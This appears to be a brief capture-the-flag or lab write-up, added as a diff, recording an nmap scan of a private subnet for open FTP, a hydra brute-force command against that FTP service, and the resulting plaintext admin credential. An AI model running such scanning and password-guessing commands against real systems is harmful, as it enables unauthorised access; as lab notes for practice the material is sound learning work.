@@ -1,0 +1,15 @@
+[21][ftp] host: 10.0.3.197   login: admin   password: 1111
+
+
+Commands
+
+ftp and then login with this admin and password
+
+to find this
+hydra -L usernames.txt -p passwords.txt ftp://10.0.3.197 -t 4 -V   
+
+to find the IP of the host which has ftp open, i do this commad
+nmap -p 21 10.0.3.0/24
+
+then boom flag
+
